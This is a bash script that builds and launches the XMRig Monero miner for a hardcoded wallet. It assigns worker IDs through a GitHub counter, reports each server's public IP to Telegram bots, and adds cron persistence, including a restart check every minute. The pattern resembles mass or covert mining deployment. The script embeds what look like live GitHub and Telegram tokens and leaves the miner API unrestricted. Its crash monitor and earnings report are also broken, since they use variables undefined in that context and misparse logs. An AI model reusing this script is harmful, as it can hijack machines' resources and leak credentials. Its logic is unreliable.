#!/bin/bash

# ===== CONFIGURATION =====
WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1JjJg3uQdY9d8ZcYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE"
SERVER_IP=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')

# GitHub Naming Server
GITHUB_REPO="chanchalkst/worker-names"  # Public repo with counter.txt
GITHUB_TOKEN="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"            # Token with repo access
NAMING_FILE="counter.txt"                # Stores current counter

# Telegram Bots
INSTALL_BOT_TOKEN="8264582378:AAEkx2WgWWOKykgFETsPje2QxuHpBAnUR-4"
HEALTH_BOT_TOKEN="7733572867:AAF3hwSUSmisYaPTztRUQ8fgfO6hQT57lAw"
EARNINGS_BOT_TOKEN="8217562760:AAGnonmR9Roa6lRmMoVUAVh7n9GpUGq-ynQ"
CRASH_BOT_TOKEN="8229778599:AAGeBM3r7TZ77FqDqwS3s-Zfh6cYKFmpTwA"
CHAT_ID="5304966667"

LOG_FILE="/var/log/xmrig_monitor.log"
LOW_HASHRATE_THRESHOLD=1.0  # kH/s

# ===== FUNCTIONS =====
send_notification() {
    local bot_token=$1
    local message=$2
    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$message" \
        -d "parse_mode=Markdown" >> "$LOG_FILE"
}

get_worker_id() {
    # Try GitHub first
    local response=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
        "https://api.github.com/repos/$GITHUB_REPO/contents/$NAMING_FILE")
    
    if [[ "$(echo "$response" | jq -r '.message')" == "Not Found" ]]; then
        # GitHub failed - local fallback
        sudo mkdir -p /etc/xmrig_workers
        local count=$(($(ls /etc/xmrig_workers 2>/dev/null | wc -l)+1))
        printf "W%06d" $count
    else
        # Get and increment counter
        local current=$(echo "$response" | jq -r '.content' | base64 --decode)
        local next=$((current + 1))
        local sha=$(echo "$response" | jq -r '.sha')
        
        # Update GitHub
        curl -s -X PUT -H "Authorization: token $GITHUB_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"message":"Update counter","content":"'$(echo $next | base64)'","sha":"'$sha'"}' \
            "https://api.github.com/repos/$GITHUB_REPO/contents/$NAMING_FILE" >/dev/null
        
        printf "W%06d" $next
    fi
}

# ===== MAIN INSTALLATION =====
{
# Generate worker ID
WORKER_ID=$(get_worker_id)
echo "Assigned Worker ID: $WORKER_ID"

# 1. Install dependencies
send_notification "$INSTALL_BOT_TOKEN" "🛠️ Starting installation for $WORKER_ID..."
sudo apt update -qq && \
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev hwloc curl jq bc screen

# 2. Build XMRig
[ -d "xmrig" ] && rm -rf xmrig
git clone https://github.com/xmrig/xmrig --depth 1
cd xmrig/build
cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON
make -j$(($(nproc)-1))

# 3. Create config
cat > ../config.json <<EOL
{
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "hw-aes": true,
    "priority": null,
    "max-threads": $(($(nproc)-1)),
    "asm": true
  },
  "pools": [{
    "url": "gulf.moneroocean.stream:10343",
    "user": "$WALLET",
    "pass": "$WORKER_ID",
    "algo": "auto",
    "tls": true
  }],
  "api": {
    "port": 3000,
    "restricted": false
  }
}
EOL

# 4. Start miner
screen -dmS xmrig ./xmrig
sleep 300 # Wait for stabilization

# 5. Get hashrate
HASHRATE=$(curl -s http://127.0.0.1:3000/api.json | jq -r '.hashrate.total[0]' | awk '{printf "%.1f", $1/1000}')
[ -z "$HASHRATE" ] && HASHRATE="0.0"

# 6. Send completion notification
send_notification "$INSTALL_BOT_TOKEN" "✅ *Installation Complete* 
━━━━━━━━━━━━━━
🆔 Worker: \`$WORKER_ID\` 
⚡ Hashrate: \`$HASHRATE kH/s\` 
🌐 IP: \`${SERVER_IP%% *}\`
🧵 Threads: $(($(nproc)-1))"

# 7. Setup monitoring
sudo mkdir -p /etc/xmrig_workers
sudo touch "/etc/xmrig_workers/$WORKER_ID"

# Earnings tracker (4-hour)
(crontab -l 2>/dev/null; echo "0 */4 * * * $(realpath "$0") --wallet-report") | crontab -

# Health checks (5-min)
(crontab -l 2>/dev/null; echo "*/5 * * * * $(realpath "$0") --health-check") | crontab -

# Crash monitor
sudo tee /usr/local/bin/xmrig_monitor <<'EOL'
#!/bin/bash
WORKER_ID=$(ls /etc/xmrig_workers/* 2>/dev/null | head -1 | xargs basename)
if ! pgrep -x "xmrig" >/dev/null; then
    curl -s -X POST "https://api.telegram.org/bot$CRASH_BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=⚠️ *Worker Crash* \n🆔 $WORKER_ID \n🔄 Restarting..." \
        -d "parse_mode=Markdown"
    cd ~/xmrig/build && ./xmrig &
fi
EOL
sudo chmod +x /usr/local/bin/xmrig_monitor
(crontab -l 2>/dev/null; echo "* * * * * /usr/local/bin/xmrig_monitor") | crontab -

} >> "$LOG_FILE" 2>&1

# ===== NOTIFICATION HANDLERS =====
case "$1" in
    --wallet-report)
        # 4-hour wallet report
        PREV_DATA=$(tail -n 2 "$LOG_FILE" | head -n 1)
        CURRENT_DATA=$(tail -n 1 "$LOG_FILE")
        
        PREV_BAL=$(echo "$PREV_DATA" | awk '{print $2}')
        CURRENT_BAL=$(echo "$CURRENT_DATA" | awk '{print $2}')
        EARNED=$(echo "scale=6; $CURRENT_BAL - $PREV_BAL" | bc)
        
        XMR_PRICE=$(curl -s "https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd" | jq '.monero.usd')
        USD_VALUE=$(echo "scale=2; $EARNED*$XMR_PRICE" | bc)
        
        send_notification "$EARNINGS_BOT_TOKEN" "💰 *4-Hour Wallet Report*
━━━━━━━━━━━━━━
▸ Previous: $PREV_BAL XMR
▸ Current:  $CURRENT_BAL XMR
▸ Earned:   +$EARNED XMR (~\$$USD_VALUE)"
        ;;
        
    --health-check)
        # Low hashrate alert
        HASHRATE=$(curl -s http://127.0.0.1:3000/api.json | jq -r '.hashrate.total[0]' | awk '{printf "%.1f", $1/1000}')
        if (( $(echo "$HASHRATE < $LOW_HASHRATE_THRESHOLD" | bc -l) )); then
            send_notification "$HEALTH_BOT_TOKEN" "⚠️ *Low Hashrate Alert*
━━━━━━━━━━━━━━
🆔 $WORKER_ID
⚡ Current: $HASHRATE kH/s
▸ Threshold: $LOW_HASHRATE_THRESHOLD kH/s"
        fi
        ;;
        
    *)
        # Main installation flow
        ;;
esac
